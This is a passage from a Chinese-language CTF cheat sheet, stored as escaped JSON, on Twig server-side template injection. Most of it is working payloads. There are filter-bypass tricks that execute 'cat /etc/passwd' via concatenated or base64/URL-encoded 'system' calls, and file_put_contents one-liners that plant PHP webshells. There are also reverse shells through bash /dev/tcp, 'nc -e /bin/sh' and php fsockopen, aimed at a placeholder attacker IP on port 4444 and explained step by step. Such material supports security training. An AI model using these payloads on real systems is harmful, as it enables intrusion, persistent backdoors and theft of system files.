&#x27;)&#125;&#125;\n\n4、字符绕过字符拼接&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;sys&#x27;~&#x27;tem&#x27;)&#125;&#125;\t\t\t\t\t\t使用&#x27;~&#x27;符号&#123;% set cmd = &#x27;system&#x27; %&#125;&#123;&#123;[&#x27;id&#x27;]|filter(cmd)&#125;&#125;\t\t定义某个指定字符替换特定字符&#123;% set filters = [&#x27;sys&#x27;,&#x27;tem&#x27;] %&#125;&#123;&#123;[&#x27;id&#x27;]|filter(filters|join)&#125;&#125;\t使用join拼接编码绕过Base64&#123;% set cmd = &#x27;Y2F0IC9ldGMvcGFzc3dk&#x27; %&#125;&#123;&#123;[cmd]|filter(&#x27;base64_decode&#x27;)|filter(&#x27;system&#x27;)&#125;&#125;Url&#123;% set cmd = &#x27;cat%20%2Fetc%2Fpasswd&#x27; %&#125;&#123;&#123;[cmd]|filter(&#x27;urldecode&#x27;)|filter(&#x27;system&#x27;)&#125;&#125;利用Twig内置功能&#123;&#123; attribute(object, property) &#125;&#125;\t\t\tattribute函数\n\n5、获取shell一句话木马\n&#123;&#123;file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;)&#125;&#125;&#123;&#123;file_put_contents(&#x27;shell.inc.php&#x27;, &#x27;&lt;?php @eval($_REQUEST[&quot;c&quot;]);?&gt;&#x27;)&#125;&#125;&#123;&#123;file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php @eval(base64_decode($_POST[&quot;c&quot;]));?&gt;&#x27;)&#125;&#125;\n\n反弹shell\n&#123;&#123;[&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/公网ip/4444 0&gt;&amp;1&quot;&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;\n\nbash -c &quot;...&quot;: \t\t\t\t\t\t执行双引号中的字符串作为bash命令。bash -i: \t\t\t\t\t\t\t启动一个交互式的bash shell。&amp; /dev/tcp/ATTACKER_IP/4444:\t\t/dev/tcp/公网ip/4444是一个特殊的文件，它代表与公网ip的4444端口建立的 TCP 连接。&amp; \t\t\t\t\t\t\t\t\t是一个文件描述符重定向操作符，它将标准输出(stdout, 文件描述符1)和标准错误(stderr, 文件描述符2)都重定向到这个TCP连接。0&gt;&amp;1: \t\t\t\t\t\t\t\t将标准输入(stdin, 文件描述符0)也重定向到标准输出，而标准输出已经被重定向到了TCP连接。这样，攻击者的输入就变成了shell的输入。\n\n&#123;&#123;[&#x27;nc -e /bin/sh 公网ip 4444&#x27;]|filter(&#x27;system&#x27;)&#125;\n\nnc ATTACKER_IP 4444: \t让目标服务器与攻击者的公网ip和4444端口建立一个TCP连接。-e /bin/sh: \t\t\t这是nc的一个非常强大的参数。它指定在连接建立后，在目标服务器上执行/bin/sh(一个 shell)，并将这个shell的输入和输出绑定到nc建立的网络连接上\n\n&#123;&#123;[&#x27;php -r \\&#x27;$s=fsockopen(&quot;公网ip&quot;,4444);exec(&quot;/bin/sh-i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\\&#x27;&#x27;]|filter(&#x27;syste m&#x27;)&#125;&#125;\n\nphp -r &#x27;...&#x27;:\t\t\t\t\t\t 执行单引号中的PHP代码。$s=fsockopen(&quot;公网ip&quot;,4444);:\t\t\t在 PHP 中，fsockopen()函数用于打开一个网络连接。这行代码会在目标服务器上创建一个到攻击者 IP 和端口的 TCP 连接，并将这个连接的资源句柄保存到变量$s中。exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);:\t exec()函数执行系统命令/bin/sh -i，即启动一个交互式shell。&lt;&amp;3, &gt;&amp;3, 2&gt;&amp;3: \t\t\t\t\t 这是关键的文件描述符重定向。在PHP中，fsockopen创建的套接字连接通常被分配文件描述符3。这行命令将shell的标准输入、输出和错误都重定向到这个套接字连接（&amp;3）。","categories":["CTF"],"tags":["web","note"]}]